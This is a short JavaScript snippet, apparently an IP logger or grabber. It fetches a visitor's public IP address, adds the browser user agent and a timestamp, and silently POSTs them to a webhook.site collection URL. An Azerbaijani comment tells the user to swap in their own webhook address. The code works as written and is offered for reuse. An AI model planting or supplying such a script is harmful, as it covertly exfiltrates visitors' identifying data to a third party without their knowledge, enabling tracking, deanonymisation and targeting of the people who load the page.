fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ipAddress = data.ip;
    const userAgent = navigator.userAgent;
    const timestamp = new Date().toISOString();

    // BURADAKI UNİVAL URL-Nİ ÖZÜNKÜ İLƏ ƏVƏZ EDİN
    const webhookUrl = 'https://webhook.site/428f1b9a-1711-4d73-b712-0040e4771068';

    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        ip: ipAddress,
        userAgent: userAgent,
        time: timestamp
      })
    });
  })
  .catch(error => console.error('Error:', error));
